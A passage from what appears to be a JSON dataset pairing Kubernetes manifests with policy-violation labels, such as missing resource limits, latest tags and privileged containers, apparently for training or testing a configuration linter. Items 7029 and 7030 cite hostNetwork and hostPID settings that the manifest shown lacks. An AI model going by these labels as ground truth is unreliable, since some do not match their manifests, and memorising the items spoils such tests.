    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: app2\n  namespace: test\nspec:\n  containers:\n  - image: app2:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 60m\n    imagePullPolicy: IfNotPresent\n    name: alpine\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"alpine\" has cpu request 0"
  },
  {
    "id": "7018",
    "manifest_path": "data/manifests/the_stack_sample/sample_2551.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: app2\n  namespace: test\nspec:\n  containers:\n  - image: app2:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 60m\n    imagePullPolicy: IfNotPresent\n    name: alpine\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"alpine\" has memory limit 0"
  },
  {
    "id": "7019",
    "manifest_path": "data/manifests/the_stack_sample/sample_2552.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: k8s-gsm-tools\n  name: secret-sync-controller\n  labels:\n    app: secret-sync-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: secret-sync-controller\n  template:\n    metadata:\n      labels:\n        app: secret-sync-controller\n    spec:\n      serviceAccountName: k8s-gsm-tools\n      containers:\n      - name: secret-sync-controller\n        image: gcr.io/k8s-staging-k8s-gsm-tools/secret-sync-controller:latest\n        args:\n        - --config-path=/tmp/config/syncConfig\n        - --period=60\n        - --v=2\n        volumeMounts:\n        - name: config-volume\n          readOnly: true\n          mountPath: /tmp/config\n      volumes:\n      - name: config-volume\n        configMap:\n          name: config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"secret-sync-controller\" is using an invalid container image, \"gcr.io/k8s-staging-k8s-gsm-tools/secret-sync-controller:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7020",
    "manifest_path": "data/manifests/the_stack_sample/sample_2552.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: k8s-gsm-tools\n  name: secret-sync-controller\n  labels:\n    app: secret-sync-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: secret-sync-controller\n  template:\n    metadata:\n      labels:\n        app: secret-sync-controller\n    spec:\n      serviceAccountName: k8s-gsm-tools\n      containers:\n      - name: secret-sync-controller\n        image: gcr.io/k8s-staging-k8s-gsm-tools/secret-sync-controller:latest\n        args:\n        - --config-path=/tmp/config/syncConfig\n        - --period=60\n        - --v=2\n        volumeMounts:\n        - name: config-volume\n          readOnly: true\n          mountPath: /tmp/config\n      volumes:\n      - name: config-volume\n        configMap:\n          name: config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"secret-sync-controller\" does not have a read-only root file system"
  },
  {
    "id": "7021",
    "manifest_path": "data/manifests/the_stack_sample/sample_2552.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: k8s-gsm-tools\n  name: secret-sync-controller\n  labels:\n    app: secret-sync-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: secret-sync-controller\n  template:\n    metadata:\n      labels:\n        app: secret-sync-controller\n    spec:\n      serviceAccountName: k8s-gsm-tools\n      containers:\n      - name: secret-sync-controller\n        image: gcr.io/k8s-staging-k8s-gsm-tools/secret-sync-controller:latest\n        args:\n        - --config-path=/tmp/config/syncConfig\n        - --period=60\n        - --v=2\n        volumeMounts:\n        - name: config-volume\n          readOnly: true\n          mountPath: /tmp/config\n      volumes:\n      - name: config-volume\n        configMap:\n          name: config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"k8s-gsm-tools\" not found"
  },
  {
    "id": "7022",
    "manifest_path": "data/manifests/the_stack_sample/sample_2552.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: k8s-gsm-tools\n  name: secret-sync-controller\n  labels:\n    app: secret-sync-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: secret-sync-controller\n  template:\n    metadata:\n      labels:\n        app: secret-sync-controller\n    spec:\n      serviceAccountName: k8s-gsm-tools\n      containers:\n      - name: secret-sync-controller\n        image: gcr.io/k8s-staging-k8s-gsm-tools/secret-sync-controller:latest\n        args:\n        - --config-path=/tmp/config/syncConfig\n        - --period=60\n        - --v=2\n        volumeMounts:\n        - name: config-volume\n          readOnly: true\n          mountPath: /tmp/config\n      volumes:\n      - name: config-volume\n        configMap:\n          name: config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"secret-sync-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "7023",
    "manifest_path": "data/manifests/the_stack_sample/sample_2552.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: k8s-gsm-tools\n  name: secret-sync-controller\n  labels:\n    app: secret-sync-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: secret-sync-controller\n  template:\n    metadata:\n      labels:\n        app: secret-sync-controller\n    spec:\n      serviceAccountName: k8s-gsm-tools\n      containers:\n      - name: secret-sync-controller\n        image: gcr.io/k8s-staging-k8s-gsm-tools/secret-sync-controller:latest\n        args:\n        - --config-path=/tmp/config/syncConfig\n        - --period=60\n        - --v=2\n        volumeMounts:\n        - name: config-volume\n          readOnly: true\n          mountPath: /tmp/config\n      volumes:\n      - name: config-volume\n        configMap:\n          name: config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"secret-sync-controller\" has cpu request 0"
  },
  {
    "id": "7024",
    "manifest_path": "data/manifests/the_stack_sample/sample_2552.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: k8s-gsm-tools\n  name: secret-sync-controller\n  labels:\n    app: secret-sync-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: secret-sync-controller\n  template:\n    metadata:\n      labels:\n        app: secret-sync-controller\n    spec:\n      serviceAccountName: k8s-gsm-tools\n      containers:\n      - name: secret-sync-controller\n        image: gcr.io/k8s-staging-k8s-gsm-tools/secret-sync-controller:latest\n        args:\n        - --config-path=/tmp/config/syncConfig\n        - --period=60\n        - --v=2\n        volumeMounts:\n        - name: config-volume\n          readOnly: true\n          mountPath: /tmp/config\n      volumes:\n      - name: config-volume\n        configMap:\n          name: config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"secret-sync-controller\" has memory limit 0"
  },
  {
    "id": "7025",
    "manifest_path": "data/manifests/the_stack_sample/sample_2553.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: sonarqube-svc\nspec:\n  type: ClusterIP\n  selector:\n    app: sonarqube\n  ports:\n  - port: 9000\n    protocol: TCP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:sonarqube])"
  },
  {
    "id": "7026",
    "manifest_path": "data/manifests/the_stack_sample/sample_2557.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: gke-test\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gke-test\n  template:\n    metadata:\n      labels:\n        app: gke-test\n    spec:\n      containers:\n      - name: gke-test\n        image: gcr.io/PROJECT_ID/IMAGE:TAG\n        ports:\n        - containerPort: 5000\n        resources:\n          requests:\n            cpu: 100m\n          limits:\n            cpu: 100m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"gke-test\" does not have a read-only root file system"
  },
  {
    "id": "7027",
    "manifest_path": "data/manifests/the_stack_sample/sample_2557.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: gke-test\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gke-test\n  template:\n    metadata:\n      labels:\n        app: gke-test\n    spec:\n      containers:\n      - name: gke-test\n        image: gcr.io/PROJECT_ID/IMAGE:TAG\n        ports:\n        - containerPort: 5000\n        resources:\n          requests:\n            cpu: 100m\n          limits:\n            cpu: 100m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"gke-test\" is not set to runAsNonRoot"
  },
  {
    "id": "7028",
    "manifest_path": "data/manifests/the_stack_sample/sample_2557.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: gke-test\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gke-test\n  template:\n    metadata:\n      labels:\n        app: gke-test\n    spec:\n      containers:\n      - name: gke-test\n        image: gcr.io/PROJECT_ID/IMAGE:TAG\n        ports:\n        - containerPort: 5000\n        resources:\n          requests:\n            cpu: 100m\n          limits:\n            cpu: 100m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"gke-test\" has memory limit 0"
  },
  {
    "id": "7029",
    "manifest_path": "data/manifests/the_stack_sample/sample_2560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: yurt-operator-agent\n  name: agent\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: yurt-operator-agent\n  template:\n    metadata:\n      labels:\n        k8s-app: yurt-operator-agent\n    spec:\n      volumes:\n      - name: host-var-tmp\n        hostPath:\n          path: /var/tmp\n          type: Directory\n      - name: kubernetes\n        hostPath:\n          path: /etc/kubernetes\n          type: Directory\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - 'cp /assets/* /tmp/\n\n          '\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-prepare\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n      containers:\n      - command:\n        - /agent\n        args:\n        - --node-name=$(NODE_NAME)\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-agent\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n        - mountPath: /etc/kubernetes\n          name: kubernetes\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1024Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: yurt-operator-agent\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "7030",
    "manifest_path": "data/manifests/the_stack_sample/sample_2560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: yurt-operator-agent\n  name: agent\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: yurt-operator-agent\n  template:\n    metadata:\n      labels:\n        k8s-app: yurt-operator-agent\n    spec:\n      volumes:\n      - name: host-var-tmp\n        hostPath:\n          path: /var/tmp\n          type: Directory\n      - name: kubernetes\n        hostPath:\n          path: /etc/kubernetes\n          type: Directory\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - 'cp /assets/* /tmp/\n\n          '\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-prepare\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n      containers:\n      - command:\n        - /agent\n        args:\n        - --node-name=$(NODE_NAME)\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-agent\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n        - mountPath: /etc/kubernetes\n          name: kubernetes\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1024Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: yurt-operator-agent\n",
    "policy_id": "host-pid",
    "violation_text": "object shares the host's process namespace (via hostPID=true)."
  },
  {
    "id": "7031",
    "manifest_path": "data/manifests/the_stack_sample/sample_2560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: yurt-operator-agent\n  name: agent\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: yurt-operator-agent\n  template:\n    metadata:\n      labels:\n        k8s-app: yurt-operator-agent\n    spec:\n      volumes:\n      - name: host-var-tmp\n        hostPath:\n          path: /var/tmp\n          type: Directory\n      - name: kubernetes\n        hostPath:\n          path: /etc/kubernetes\n          type: Directory\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - 'cp /assets/* /tmp/\n\n          '\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-prepare\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n      containers:\n      - command:\n        - /agent\n        args:\n        - --node-name=$(NODE_NAME)\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-agent\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n        - mountPath: /etc/kubernetes\n          name: kubernetes\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1024Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: yurt-operator-agent\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"yurt-operator-agent\" does not have a read-only root file system"
  },
  {
    "id": "7032",
    "manifest_path": "data/manifests/the_stack_sample/sample_2560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: yurt-operator-agent\n  name: agent\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: yurt-operator-agent\n  template:\n    metadata:\n      labels:\n        k8s-app: yurt-operator-agent\n    spec:\n      volumes:\n      - name: host-var-tmp\n        hostPath:\n          path: /var/tmp\n          type: Directory\n      - name: kubernetes\n        hostPath:\n          path: /etc/kubernetes\n          type: Directory\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - 'cp /assets/* /tmp/\n\n          '\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-prepare\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n      containers:\n      - command:\n        - /agent\n        args:\n        - --node-name=$(NODE_NAME)\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-agent\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n        - mountPath: /etc/kubernetes\n          name: kubernetes\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1024Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: yurt-operator-agent\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"yurt-operator-prepare\" does not have a read-only root file system"
  },
  {
    "id": "7033",
    "manifest_path": "data/manifests/the_stack_sample/sample_2560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: yurt-operator-agent\n  name: agent\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: yurt-operator-agent\n  template:\n    metadata:\n      labels:\n        k8s-app: yurt-operator-agent\n    spec:\n      volumes:\n      - name: host-var-tmp\n        hostPath:\n          path: /var/tmp\n          type: Directory\n      - name: kubernetes\n        hostPath:\n          path: /etc/kubernetes\n          type: Directory\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - 'cp /assets/* /tmp/\n\n          '\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-prepare\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n      containers:\n      - command:\n        - /agent\n        args:\n        - --node-name=$(NODE_NAME)\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-agent\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n        - mountPath: /etc/kubernetes\n          name: kubernetes\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1024Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: yurt-operator-agent\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"yurt-operator-agent\" not found"
  },
  {
    "id": "7034",
    "manifest_path": "data/manifests/the_stack_sample/sample_2560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: yurt-operator-agent\n  name: agent\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: yurt-operator-agent\n  template:\n    metadata:\n      labels:\n        k8s-app: yurt-operator-agent\n    spec:\n      volumes:\n      - name: host-var-tmp\n        hostPath:\n          path: /var/tmp\n          type: Directory\n      - name: kubernetes\n        hostPath:\n          path: /etc/kubernetes\n          type: Directory\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - 'cp /assets/* /tmp/\n\n          '\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-prepare\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n      containers:\n      - command:\n        - /agent\n        args:\n        - --node-name=$(NODE_NAME)\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-agent\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n        - mountPath: /etc/kubernetes\n          name: kubernetes\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1024Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: yurt-operator-agent\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"yurt-operator-agent\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "7035",
    "manifest_path": "data/manifests/the_stack_sample/sample_2560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: yurt-operator-agent\n  name: agent\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: yurt-operator-agent\n  template:\n    metadata:\n      labels:\n        k8s-app: yurt-operator-agent\n    spec:\n      volumes:\n      - name: host-var-tmp\n        hostPath:\n          path: /var/tmp\n          type: Directory\n      - name: kubernetes\n        hostPath:\n          path: /etc/kubernetes\n          type: Directory\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - 'cp /assets/* /tmp/\n\n          '\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-prepare\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n      containers:\n      - command:\n        - /agent\n        args:\n        - --node-name=$(NODE_NAME)\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-agent\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n        - mountPath: /etc/kubernetes\n          name: kubernetes\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1024Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: yurt-operator-agent\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"yurt-operator-agent\" is privileged"
  },
  {
    "id": "7036",
    "manifest_path": "data/manifests/the_stack_sample/sample_2560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: yurt-operator-agent\n  name: agent\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: yurt-operator-agent\n  template:\n    metadata:\n      labels:\n        k8s-app: yurt-operator-agent\n    spec:\n      volumes:\n      - name: host-var-tmp\n        hostPath:\n          path: /var/tmp\n          type: Directory\n      - name: kubernetes\n        hostPath:\n          path: /etc/kubernetes\n          type: Directory\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - 'cp /assets/* /tmp/\n\n          '\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-prepare\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n      containers:\n      - command:\n        - /agent\n        args:\n        - --node-name=$(NODE_NAME)\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-agent\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n        - mountPath: /etc/kubernetes\n          name: kubernetes\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1024Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: yurt-operator-agent\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"yurt-operator-agent\" is not set to runAsNonRoot"
  },
  {
    "id": "7037",
    "manifest_path": "data/manifests/the_stack_sample/sample_2560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: yurt-operator-agent\n  name: agent\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: yurt-operator-agent\n  template:\n    metadata:\n      labels:\n        k8s-app: yurt-operator-agent\n    spec:\n      volumes:\n      - name: host-var-tmp\n        hostPath:\n          path: /var/tmp\n          type: Directory\n      - name: kubernetes\n        hostPath:\n          path: /etc/kubernetes\n          type: Directory\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - 'cp /assets/* /tmp/\n\n          '\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-prepare\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n      containers:\n      - command:\n        - /agent\n        args:\n        - --node-name=$(NODE_NAME)\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-agent\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n        - mountPath: /etc/kubernetes\n          name: kubernetes\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1024Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: yurt-operator-agent\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"yurt-operator-prepare\" is not set to runAsNonRoot"
  },
  {
    "id": "7038",
    "manifest_path": "data/manifests/the_stack_sample/sample_2560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: yurt-operator-agent\n  name: agent\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: yurt-operator-agent\n  template:\n    metadata:\n      labels:\n        k8s-app: yurt-operator-agent\n    spec:\n      volumes:\n      - name: host-var-tmp\n        hostPath:\n          path: /var/tmp\n          type: Directory\n      - name: kubernetes\n        hostPath:\n          path: /etc/kubernetes\n          type: Directory\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - 'cp /assets/* /tmp/\n\n          '\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-prepare\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n      containers:\n      - command:\n        - /agent\n        args:\n        - --node-name=$(NODE_NAME)\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-agent\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n        - mountPath: /etc/kubernetes\n          name: kubernetes\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1024Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: yurt-operator-agent\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"yurt-operator-prepare\" has cpu request 0"
  },
  {
    "id": "7039",
    "manifest_path": "data/manifests/the_stack_sample/sample_2560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: yurt-operator-agent\n  name: agent\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: yurt-operator-agent\n  template:\n    metadata:\n      labels:\n        k8s-app: yurt-operator-agent\n    spec:\n      volumes:\n      - name: host-var-tmp\n        hostPath:\n          path: /var/tmp\n          type: Directory\n      - name: kubernetes\n        hostPath:\n          path: /etc/kubernetes\n          type: Directory\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - 'cp /assets/* /tmp/\n\n          '\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-prepare\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n      containers:\n      - command:\n        - /agent\n        args:\n        - --node-name=$(NODE_NAME)\n        image: openyurt-operator-agent:v1.0.2\n        imagePullPolicy: IfNotPresent\n        name: yurt-operator-agent\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: host-var-tmp\n        - mountPath: /etc/kubernetes\n          name: kubernetes\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1024Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: yurt-operator-agent\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"yurt-operator-prepare\" has memory limit 0"
  },
  {
    "id": "7040",
    "manifest_path": "data/manifests/the_stack_sample/sample_2562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4037\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7041",
    "manifest_path": "data/manifests/the_stack_sample/sample_2562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4037\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7042",
    "manifest_path": "data/manifests/the_stack_sample/sample_2562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4037\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7043",
    "manifest_path": "data/manifests/the_stack_sample/sample_2562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4037\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7044",
    "manifest_path": "data/manifests/the_stack_sample/sample_2562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4037\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7045",
    "manifest_path": "data/manifests/the_stack_sample/sample_2564.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-619\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7046",
    "manifest_path": "data/manifests/the_stack_sample/sample_2564.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-619\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7047",
    "manifest_path": "data/manifests/the_stack_sample/sample_2564.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-619\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7048",
    "manifest_path": "data/manifests/the_stack_sample/sample_2564.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-619\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
